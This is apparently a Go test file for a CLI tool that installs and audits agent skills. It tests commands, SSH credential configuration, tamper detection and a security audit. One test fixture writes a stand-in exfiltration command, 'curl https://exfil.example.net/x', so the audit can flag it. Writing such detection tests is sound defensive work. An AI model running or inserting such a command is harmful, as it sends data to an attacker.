package main

import (
	"context"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/relux-works/curator/internal/buildrepo"
	"github.com/relux-works/curator/internal/config"
	"github.com/relux-works/curator/internal/godriver"
	"github.com/relux-works/curator/internal/hashing"
	"github.com/relux-works/curator/internal/install"
	"github.com/relux-works/curator/internal/manifest"
	"github.com/relux-works/curator/internal/marker"
)

func TestProductionExternalDepsBindTrustedGitAndAudit(t *testing.T) {
	deps := productionExternalDeps(&config.Config{}, true)
	if err := buildrepo.ValidateGitTool(context.Background(), deps.GitTool); err != nil {
		t.Fatalf("production Git dependency is unusable: %v", err)
	}
	if deps.AuditWarnings == nil {
		t.Fatal("production external audit dependency is nil")
	}
	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
		Declared:     buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
		Effective:    buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)},
		SnapshotRoot: t.TempDir(),
	})
	if err != nil || len(warnings) != 0 {
		t.Fatalf("disabled configured audit rejected structurally valid subject: %v", err)
	}
}

func TestProductionExternalAuditReturnsAdvisoryWarnings(t *testing.T) {
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, "scripts"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "scripts", "tool"), []byte("curl https://exfil.example.net/x\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := &config.Config{Path: filepath.Join(t.TempDir(), "config.json"), Audit: config.Audit{Enabled: true, Mode: "advisory", FailOn: "high", Backend: "null"}}
	deps := productionExternalDeps(cfg, true)
	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
		Declared:  buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
		Effective: buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)}, SnapshotRoot: root,
	})
	if err != nil || len(warnings) == 0 {
		t.Fatalf("advisory audit warnings=%v err=%v", warnings, err)
	}
}

func TestUsageEnumeratesDocumentedCommands(t *testing.T) {
	for _, command := range []string{
		"bootstrap", "init", "add", "remove", "install", "update", "upgrade",
		"status", "list", "project", "config", "skill", "global", "hybrid",
		"audit", "gc", "shell-init", "ui",
	} {
		if !strings.Contains(usage, command) {
			t.Fatalf("usage does not enumerate %q", command)
		}
	}
}

func TestRunVersionExitsZero(t *testing.T) {
	if code := run([]string{"--version"}); code != 0 {
		t.Fatalf("run(--version) = %d, want 0", code)
	}
}

func TestRunNoArgsPrintsUsage(t *testing.T) {
	if code := run(nil); code != 2 {
		t.Fatalf("run() = %d, want 2", code)
	}
}

func TestRunUnknownCommand(t *testing.T) {
	if code := run([]string{"frobnicate"}); code != 2 {
		t.Fatalf("run(frobnicate) = %d, want 2", code)
	}
}

func TestShellInitPrintsHooks(t *testing.T) {
	for _, shellName := range []string{"auto", "zsh", "bash", "powershell"} {
		if code := run([]string{"shell-init", shellName}); code != 0 {
			t.Fatalf("shell-init %s = %d", shellName, code)
		}
	}
	if code := run([]string{"shell-init"}); code != 0 {
		t.Fatalf("auto shell-init = %d", code)
	}
	if code := run([]string{"shell-init", "fish"}); code != 2 {
		t.Fatalf("unsupported shell must be usage error")
	}
	if code := run([]string{"shell-init", "fish", "--install"}); code != 2 {
		t.Fatalf("unsupported installed shell must be usage error")
	}
}

func TestShellInitInstallCachesHookWithoutConfig(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "manager home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	t.Setenv("SHELL", "/bin/bash")
	if code := run([]string{"shell-init", "--install", "--no-global"}); code != exitOK {
		t.Fatalf("shell-init --install = %d", code)
	}
	hookPath := filepath.Join(filepath.Dir(configPath), "hooks", "curator.bash")
	payload, err := os.ReadFile(hookPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(payload), "_curator_global_env_file") {
		t.Fatalf("--no-global cached a global hook:\n%s", payload)
	}
}

func TestSkillCheckOnTempDir(t *testing.T) {
	// an empty directory fails validation (missing SKILL.md)
	dir := t.TempDir()
	if code := run([]string{"skill", "check", dir}); code != 1 {
		t.Fatalf("skill check on empty dir = %d, want 1", code)
	}
	if code := run([]string{"skill", "check", dir, "--json"}); code != 1 {
		t.Fatalf("skill check with trailing --json = %d, want 1", code)
	}
}

func TestInstallFlagsAcceptTrailingOptions(t *testing.T) {
	opts, positional, all, auditMode, err := installFlags([]string{"project-a", "--dry-run", "--strict-tags", "--audit", "strict"})
	if err != nil {
		t.Fatal(err)
	}
	if len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("positional = %v", positional)
	}
	if !opts.DryRun || !opts.StrictTags || all || auditMode != "strict" {
		t.Fatalf("parsed flags: opts=%+v all=%v audit=%q", opts, all, auditMode)
	}
}

func TestInstallAuditFlagAcceptsOptionalMode(t *testing.T) {
	_, positional, _, auditMode, err := installFlags([]string{"--audit", "project-a"})
	if err != nil || auditMode != "advisory" || len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("bare --audit: positional=%v mode=%q err=%v", positional, auditMode, err)
	}
	_, positional, _, auditMode, err = installFlags([]string{"project-a", "--audit", "strict"})
	if err != nil || auditMode != "strict" || len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("strict --audit: positional=%v mode=%q err=%v", positional, auditMode, err)
	}
}

// The run-wide SSH selection reaches an install from the command line, and the
// environment fills only what the command line left unsaid.
func TestInstallFlagsCarryTheRunWideBuildSSHSelection(t *testing.T) {
	opts, positional, _, _, err := installFlags([]string{
		"project-a", "--build-ssh-agent", "auto", "--build-ssh-identity", "/operator/id.pub",
		"--build-ssh-known-hosts", "/operator/known_hosts",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(positional) != 1 || positional[0] != "project-a" {
		t.Fatalf("positional = %v", positional)
	}
	want := install.BuildSSHFlags{
		Identity: "/operator/id.pub", Agent: install.BuildSSHAgentAuto,
		KnownHosts: "/operator/known_hosts",
	}
	if opts.BuildSSH != want {
		t.Fatalf("build-ssh flags = %+v, want %+v", opts.BuildSSH, want)
	}

	environment := map[string]string{
		install.EnvBuildSSHIdentity: "/operator/env.pub",
		install.EnvBuildSSHAgent:    "/operator/env.sock",
		"SSH_AUTH_SOCK":             "/operator/live.sock",
	}
	selection := install.CaptureBuildSSHSelection(nil, opts.BuildSSH,
		func(name string) string { return environment[name] })
	if selection.RunWide.Identity != "/operator/id.pub" || selection.RunWide.Agent != install.BuildSSHAgentAuto {
		t.Fatalf("selection = %+v, want the flag values to win", selection.RunWide)
	}
	if selection.AgentSocket != "/operator/live.sock" {
		t.Fatalf("live agent socket = %q", selection.AgentSocket)
	}
}

func TestSelectProjectTargetsUsesAliasesAndStableAllOrder(t *testing.T) {
	cfg := &config.Config{Projects: map[string]config.Project{
		"zeta":  {Path: "/work/zeta"},
		"alpha": {Path: "/work/alpha"},
	}}
	targets, err := selectProjectTargets(cfg, []string{"alpha"}, false)
	if err != nil || len(targets) != 1 || targets[0].Root != "/work/alpha" || targets[0].Alias != "alpha" {
		t.Fatalf("alias targets = %+v, %v", targets, err)
	}
	targets, err = selectProjectTargets(cfg, nil, true)
	if err != nil || len(targets) != 2 || targets[0].Alias != "alpha" || targets[1].Alias != "zeta" {
		t.Fatalf("all targets = %+v, %v", targets, err)
	}
}

func TestStatusDriftDetectsContentTampering(t *testing.T) {
	project := t.TempDir()
	skillsRoot := t.TempDir()
	if err := os.WriteFile(filepath.Join(project, "Skillfile.json"), []byte(
		`{"schema_version":1,"skills":[{"name":"skill-a","tag":"v1"}]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	installed := filepath.Join(project, ".agents", "skills", "skill-a")
	if err := os.MkdirAll(installed, 0o755); err != nil {
		t.Fatal(err)
	}
	skillPath := filepath.Join(installed, "SKILL.md")
	if err := os.WriteFile(skillPath, []byte("original"), 0o644); err != nil {
		t.Fatal(err)
	}
	hash, err := hashing.ContentSHA256(installed, nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := marker.Write(installed, &marker.Marker{
		Name: "skill-a", Source: "skill-a", RefKind: "tag", Ref: "v1",
		Commit: "0123456789abcdef0123456789abcdef01234567", ContentSHA256: hash,
		InstalledAt: "2026-07-13T00:00:00Z",
	}); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(skillPath, []byte("tampered"), 0o644); err != nil {
		t.Fatal(err)
	}
	drift := statusDrift(&config.Config{SkillsRoot: skillsRoot}, project)
	if drift["skill-a"] != "content-drift" {
		t.Fatalf("drift = %v", drift)
	}
}

func TestBootstrapAndProjectCommands(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := t.TempDir()
	if code := run([]string{"bootstrap", "--non-interactive", "--skills-root", skillsRoot}); code != exitOK {
		t.Fatalf("bootstrap = %d", code)
	}
	project := t.TempDir()
	if code := run([]string{"project", "add", "app", project, "--agents", "codex_cli"}); code != exitOK {
		t.Fatalf("project add = %d", code)
	}
	if _, err := os.Stat(filepath.Join(project, manifest.Name)); err != nil {
		t.Fatalf("project manifest missing: %v", err)
	}
	if code := run([]string{"project", "resolve", "app"}); code != exitOK {
		t.Fatalf("project resolve = %d", code)
	}
	cfg, err := config.Load(configPath, nil)
	if err != nil || cfg.Projects["app"].Path != project {
		t.Fatalf("saved project: cfg=%+v err=%v", cfg, err)
	}
}

func TestBootstrapIfMissingKeepsExistingConfigWithoutParsing(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "config.json")
	original := []byte("this is intentionally not valid JSON\n")
	if err := os.WriteFile(configPath, original, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)

	if code := run([]string{"bootstrap", "--if-missing", "--non-interactive"}); code != exitOK {
		t.Fatalf("bootstrap --if-missing = %d", code)
	}
	payload, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(payload) != string(original) {
		t.Fatalf("existing config changed:\n%s", payload)
	}
}

func TestBootstrapIfMissingCreatesAbsentConfig(t *testing.T) {
	configPath := filepath.Join(t.TempDir(), "home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := filepath.Join(t.TempDir(), "skills")

	if code := run([]string{"bootstrap", "--if-missing", "--non-interactive", "--skills-root", skillsRoot}); code != exitOK {
		t.Fatalf("bootstrap --if-missing = %d", code)
	}
	loaded, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if loaded.SkillsRoot != skillsRoot {
		t.Fatalf("skills_root = %q, want %q", loaded.SkillsRoot, skillsRoot)
	}
}

func TestBootstrapIfMissingRejectsForce(t *testing.T) {
	t.Setenv("CURATOR_CONFIG", filepath.Join(t.TempDir(), "config.json"))
	if code := run([]string{"bootstrap", "--if-missing", "--force"}); code != exitUsage {
		t.Fatalf("bootstrap --if-missing --force = %d, want %d", code, exitUsage)
	}
}

func TestUpgradeDryRunDoesNotCreateOrFetchSkillsRoot(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	skillsRoot := filepath.Join(root, "missing-skills")
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(`{"schema_version":1,"agents":["codex_cli"],"skills":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	if err := config.AddProject(configPath, "app", project, []string{"codex_cli"}); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)

	if code := run([]string{"upgrade", "app", "--dry-run"}); code != exitOK {
		t.Fatalf("upgrade --dry-run = %d", code)
	}
	if _, err := os.Stat(skillsRoot); !os.IsNotExist(err) {
		t.Fatalf("upgrade --dry-run created skills root: %v", err)
	}
}

func TestGlobalUpgradeDryRunDoesNotCreateSkillsRoot(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	skillsRoot := filepath.Join(root, "missing-skills")
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	t.Setenv("CURATOR_CONFIG", configPath)
	if code := run([]string{"global", "init"}); code != exitOK {
		t.Fatalf("global init = %d", code)
	}
	if code := run([]string{"global", "upgrade", "--dry-run"}); code != exitOK {
		t.Fatalf("global upgrade --dry-run = %d", code)
	}
	if _, err := os.Stat(skillsRoot); !os.IsNotExist(err) {
		t.Fatalf("global upgrade --dry-run created skills root: %v", err)
	}
}

func TestCLIEndToEndInstallStatusAndTamperCheck(t *testing.T) {
	root := t.TempDir()
	configPath := filepath.Join(root, "home", "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	skillsRoot := filepath.Join(root, "skills")
	project := filepath.Join(root, "project")
	if err := os.MkdirAll(filepath.Join(skillsRoot, "skill-a"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}

	skillRepo := filepath.Join(skillsRoot, "skill-a")
	runGit(t, skillRepo, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(skillRepo, "SKILL.md"), []byte("---\nname: skill-a\n---\n# Skill\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, skillRepo, "add", ".")
	runGit(t, skillRepo, "commit", "-qm", "initial skill")
	runGit(t, skillRepo, "tag", "v1")

	runGit(t, project, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(project, ".gitignore"), []byte(".agents/\n.codex/skills/\nSkillfile.dev.json\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, manifest.Name), []byte(
		`{"schema_version":1,"agents":["codex_cli"],"skills":[{"name":"skill-a","tag":"v1"}]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := config.Bootstrap(configPath, skillsRoot, "", []string{"codex_cli"}, false); err != nil {
		t.Fatal(err)
	}
	if err := config.AddProject(configPath, "app", project, []string{"codex_cli"}); err != nil {
		t.Fatal(err)
	}

	if code := run([]string{"install", "app"}); code != exitOK {
		t.Fatalf("install = %d", code)
	}
	installedSkill := filepath.Join(project, ".agents", "skills", "skill-a", "SKILL.md")
	if _, err := os.Stat(installedSkill); err != nil {
		t.Fatalf("installed skill missing: %v", err)
	}
	if code := run([]string{"status", "app", "--check"}); code != exitOK {
		t.Fatalf("clean status = %d", code)
	}
	if err := os.WriteFile(installedSkill, []byte("tampered\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if code := run([]string{"status", "app", "--check"}); code != exitFail {
		t.Fatalf("tampered status = %d, want %d", code, exitFail)
	}
}

func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	// Test repositories are data fixtures, never signing operations. Ignore
	// workstation signing policy so credentials cannot be requested or folded
	// into source/package inputs during lifecycle tests.
	gitArgs := append([]string{"-c", "commit.gpgsign=false", "-c", "tag.gpgSign=false"}, args...)
	command := exec.Command("git", gitArgs...)
	command.Dir = dir
	command.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=Test", "GIT_AUTHOR_EMAIL=test@example.com",
		"GIT_COMMITTER_NAME=Test", "GIT_COMMITTER_EMAIL=test@example.com",
	)
	if output, err := command.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, output)
	}
}

// TestHiddenWorkerModeIsNotAUserVisibleCommand proves the fixed go-v1 worker
// mode is dispatched before command parsing and never appears in the CLI
// surface, so no package, manifest, or user option can reach it by name.
func TestHiddenWorkerModeIsNotAUserVisibleCommand(t *testing.T) {
	if strings.Contains(usage, godriver.WorkerMode) {
		t.Fatal("the hidden worker mode appears in the user-visible command surface")
	}
	if code := run([]string{godriver.WorkerMode}); code != exitUsage {
		t.Fatalf("run(%q) = %d, want the unknown-command usage exit", godriver.WorkerMode, code)
	}
	if code := run([]string{godriver.WorkerMode, "extra"}); code != exitUsage {
		t.Fatalf("run with an extra argument = %d, want the unknown-command usage exit", code)
	}
}

// bootstrapConfig points the CLI at a private config file and creates it.
func bootstrapConfig(t *testing.T) string {
	t.Helper()
	configPath := filepath.Join(t.TempDir(), "config.json")
	t.Setenv("CURATOR_CONFIG", configPath)
	if code := run([]string{"bootstrap", "--non-interactive", "--skills-root", t.TempDir()}); code != exitOK {
		t.Fatalf("bootstrap = %d", code)
	}
	return configPath
}

// captureStdout collects what a command prints, so a test can assert on the
// listing itself rather than only on its exit code.
func captureStdout(t *testing.T, body func()) string {
	t.Helper()
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	saved := os.Stdout
	os.Stdout = writer
	defer func() { os.Stdout = saved }()
	body()
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	output, err := io.ReadAll(reader)
	if err != nil {
		t.Fatal(err)
	}
	return string(output)
}

func TestConfigBuildSSHAddListRemove(t *testing.T) {
	configPath := bootstrapConfig(t)

	for _, args := range [][]string{
		{"config", "build-ssh", "add", "zeta.example.com", "--agent"},
		{"config", "build-ssh", "add", "git.example.com/portals", "--agent", "/run/portals.sock",
			"--identity", "~/.ssh/portals", "--known-hosts", "/etc/ssh/known_hosts_portals"},
		{"config", "build-ssh", "add", "git.example.com", "--identity", "/keys/org"},
	} {
		if code := run(args); code != exitOK {
			t.Fatalf("%v = %d, want %d", args, code, exitOK)
		}
	}

	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := config.BuildSSHCredential{
		Scope: "git.example.com/portals", Agent: true, AgentSocket: "/run/portals.sock",
		Identity: "~/.ssh/portals", KnownHosts: "/etc/ssh/known_hosts_portals",
	}
	if got := cfg.BuildSSH["git.example.com/portals"]; got != want {
		t.Fatalf("credential = %+v, want %+v", got, want)
	}

	// A second add under the same scope replaces the entry rather than
	// merging with it: the leftover agent selection would still authenticate.
	replaceOutput := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "add", "zeta.example.com", "--identity", "/keys/zeta"}); code != exitOK {
			t.Fatalf("replace add = %d", code)
		}
	})
	if !strings.HasPrefix(replaceOutput, "replaced build_ssh scope zeta.example.com: identity=/keys/zeta") {
		t.Fatalf("replace output = %q", replaceOutput)
	}
	cfg, err = config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if replaced := cfg.BuildSSH["zeta.example.com"]; replaced.Agent || replaced.Identity != "/keys/zeta" {
		t.Fatalf("replaced credential = %+v", replaced)
	}

	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "list"}); code != exitOK {
			t.Fatalf("list = %d", code)
		}
	})
	wantListing := "git.example.com\tidentity=/keys/org\n" +
		"git.example.com/portals\tagent=/run/portals.sock identity=~/.ssh/portals known_hosts=/etc/ssh/known_hosts_portals\n" +
		"zeta.example.com\tidentity=/keys/zeta\n"
	if listing != wantListing {
		t.Fatalf("listing =\n%q\nwant\n%q", listing, wantListing)
	}

	if code := run([]string{"config", "build-ssh", "remove", "git.example.com/portals"}); code != exitOK {
		t.Fatalf("remove = %d", code)
	}
	cfg, err = config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, present := cfg.BuildSSH["git.example.com/portals"]; present {
		t.Fatalf("removed scope still configured: %+v", cfg.BuildSSH)
	}
	if len(cfg.BuildSSH) != 2 {
		t.Fatalf("remove disturbed other scopes: %+v", cfg.BuildSSH)
	}
}

func TestConfigBuildSSHListWithoutScopesPrintsNothing(t *testing.T) {
	bootstrapConfig(t)
	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "list"}); code != exitOK {
			t.Fatalf("empty list = %d", code)
		}
	})
	if listing != "" {
		t.Fatalf("empty listing = %q, want no stdout", listing)
	}
}

func TestConfigBuildSSHAddRejectsInvalidInvocations(t *testing.T) {
	configPath := bootstrapConfig(t)
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	for name, args := range map[string][]string{
		"no scope":            {"config", "build-ssh", "add", "--agent"},
		"two scopes":          {"config", "build-ssh", "add", "a.example.com", "b.example.com", "--agent"},
		"uppercase host":      {"config", "build-ssh", "add", "Git.Example.com", "--agent"},
		"dot segment":         {"config", "build-ssh", "add", "git.example.com/../etc", "--agent"},
		"empty segment":       {"config", "build-ssh", "add", "git.example.com//portals", "--agent"},
		"scheme in scope":     {"config", "build-ssh", "add", "ssh://git.example.com", "--agent"},
		"selects nothing":     {"config", "build-ssh", "add", "git.example.com"},
		"known hosts only":    {"config", "build-ssh", "add", "git.example.com", "--known-hosts", "/etc/kh"},
		"relative identity":   {"config", "build-ssh", "add", "git.example.com", "--identity", "keys/org"},
		"relative socket":     {"config", "build-ssh", "add", "git.example.com", "--agent=run/agent.sock"},
		"relative known host": {"config", "build-ssh", "add", "git.example.com", "--identity", "/keys/org", "--known-hosts", "kh"},
		"negated agent":       {"config", "build-ssh", "add", "git.example.com", "--agent=false"},
		"unknown flag":        {"config", "build-ssh", "add", "git.example.com", "--agent", "--pin", "x"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%s: %v = %d, want %d", name, args, code, exitUsage)
		}
	}
	after, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(after) != string(before) {
		t.Fatalf("a rejected add rewrote the config:\n%s", after)
	}
}

func TestConfigBuildSSHAgentFlagKeepsScopePositional(t *testing.T) {
	configPath := bootstrapConfig(t)
	if code := run([]string{"config", "build-ssh", "add", "--agent", "alpha.example.com"}); code != exitOK {
		t.Fatalf("bare --agent before the scope = %d", code)
	}
	if code := run([]string{"config", "build-ssh", "add", "beta.example.com", "--agent", "/run/beta.sock"}); code != exitOK {
		t.Fatalf("--agent with a socket = %d", code)
	}
	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	alpha := cfg.BuildSSH["alpha.example.com"]
	if !alpha.Agent || alpha.AgentSocket != "" {
		t.Fatalf("alpha credential = %+v", alpha)
	}
	beta := cfg.BuildSSH["beta.example.com"]
	if !beta.Agent || beta.AgentSocket != "/run/beta.sock" {
		t.Fatalf("beta credential = %+v", beta)
	}
}

func TestConfigBuildSSHRemoveRejectsMissingAndMalformedTargets(t *testing.T) {
	bootstrapConfig(t)
	if code := run([]string{"config", "build-ssh", "add", "git.example.com", "--agent"}); code != exitOK {
		t.Fatalf("add = %d", code)
	}
	if code := run([]string{"config", "build-ssh", "remove", "other.example.com"}); code != exitFail {
		t.Fatalf("remove of an unconfigured scope = %d, want %d", code, exitFail)
	}
	for _, args := range [][]string{
		{"config", "build-ssh", "remove"},
		{"config", "build-ssh", "remove", "a.example.com", "b.example.com"},
		{"config", "build-ssh", "remove", "--agent"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%v = %d, want %d", args, code, exitUsage)
		}
	}
}

func TestConfigHelpDocumentsPrecedenceAndSubcommands(t *testing.T) {
	for _, fragment := range []string{
		"curator config build-ssh add <scope>",
		"curator config build-ssh list",
		"curator config build-ssh remove <scope>",
		"--known-hosts PATH",
		"CURATOR_BUILD_SSH_*",
	} {
		if !strings.Contains(buildSSHUsage, fragment) {
			t.Fatalf("build-ssh help does not document %q", fragment)
		}
	}
	// Precedence is the operator's only defence against a stale config scope
	// silently outranking the flag they just typed.
	flags := strings.Index(buildSSHUsage, "flags override")
	environment := strings.Index(buildSSHUsage, "CURATOR_BUILD_SSH_*")
	scopes := strings.Index(buildSSHUsage, "override the scopes configured here")
	if flags < 0 || flags >= environment || environment >= scopes {
		t.Fatalf("help must order precedence flags > env > config scopes: %d %d %d", flags, environment, scopes)
	}
	if !strings.Contains(configUsage, "build-ssh") || !strings.Contains(configUsage, "curator config show") {
		t.Fatalf("config help does not enumerate its subcommands: %q", configUsage)
	}
}

func TestConfigSubcommandDispatch(t *testing.T) {
	bootstrapConfig(t)
	for _, args := range [][]string{
		{"config", "-h"},
		{"config", "build-ssh", "-h"},
		{"config", "show"},
	} {
		if code := run(args); code != exitOK {
			t.Fatalf("%v = %d, want %d", args, code, exitOK)
		}
	}
	for _, args := range [][]string{
		{"config"},
		{"config", "frobnicate"},
		{"config", "build-ssh"},
		{"config", "build-ssh", "frobnicate"},
	} {
		if code := run(args); code != exitUsage {
			t.Fatalf("%v = %d, want %d", args, code, exitUsage)
		}
	}
}

// TestTheCredentialPromptIsWiredOnlyWhereAnOperatorCanAnswerIt proves the two
// conditions the interactive precheck depends on. A test process is not a
// terminal, so both cases here are the fail-closed one; the dry-run case is
// asserted separately because it must hold even in front of a real terminal.
func TestTheCredentialPromptIsWiredOnlyWhereAnOperatorCanAnswerIt(t *testing.T) {
	cfg := &config.Config{Path: filepath.Join(t.TempDir(), "config.json")}
	if resolver := operatorBuildSSHResolver(cfg, true); resolver != nil {
		t.Fatal("a dry run offered to persist a credential")
	}
	if resolver := operatorBuildSSHResolver(cfg, false); resolver != nil {
		t.Fatal("a non-interactive process offered a prompt nobody can answer")
	}
	// `< /dev/null` is a character device. Treating that as a terminal would
	// make a scripted run block on a question instead of failing closed.
	devNull, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = devNull.Close() }()
	if attachedToTerminal(devNull) {
		t.Fatal(os.DevNull + " was reported as a terminal")
	}
	pipeRead, pipeWrite, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = pipeRead.Close(); _ = pipeWrite.Close() }()
	if attachedToTerminal(pipeRead) {
		t.Fatal("a pipe was reported as a terminal")
	}
}

// TestThePromptPersistsThroughTheOrdinaryConfigWriter proves the resolver
// wiring records exactly what `curator config build-ssh add` would, so a
// prompted answer and a typed command leave the same configuration behind.
func TestThePromptPersistsThroughTheOrdinaryConfigWriter(t *testing.T) {
	configPath := bootstrapConfig(t)
	cfg, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	transcript := &strings.Builder{}
	resolver := install.InteractiveBuildSSHResolver(strings.NewReader("\n\n"), transcript,
		func(credential config.BuildSSHCredential) error {
			_, setErr := config.SetBuildSSH(cfg.Path, credential)
			return setErr
		})
	added, err := resolver([]install.BuildSSHRequest{{
		Skill: "portals", Command: "build-tool",
		Identity:     "git.example.test/portals/app",
		DefaultScope: "git.example.test/portals",
	}}, install.BuildSSHCandidates{
		AgentSocket: "/run/agent.sock", AgentKeys: 1, AgentKeysKnown: true,
		Identities: []string{"~/.ssh/id_ed25519.pub"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(added) != 1 {
		t.Fatalf("resolver returned %+v", added)
	}
	reloaded, err := config.Load(configPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	want := config.BuildSSHCredential{
		Scope: "git.example.test/portals", Agent: true, Identity: "~/.ssh/id_ed25519.pub",
	}
	if got := reloaded.BuildSSH["git.example.test/portals"]; got != want {
		t.Fatalf("persisted credential = %+v, want %+v", got, want)
	}
	// The same entry the CLI would have written, byte for byte in the listing.
	listing := captureStdout(t, func() {
		if code := run([]string{"config", "build-ssh", "list"}); code != exitOK {
			t.Fatalf("list = %d", code)
		}
	})
	if listing != "git.example.test/portals\tagent identity=~/.ssh/id_ed25519.pub\n" {
		t.Fatalf("listing = %q", listing)
	}
}
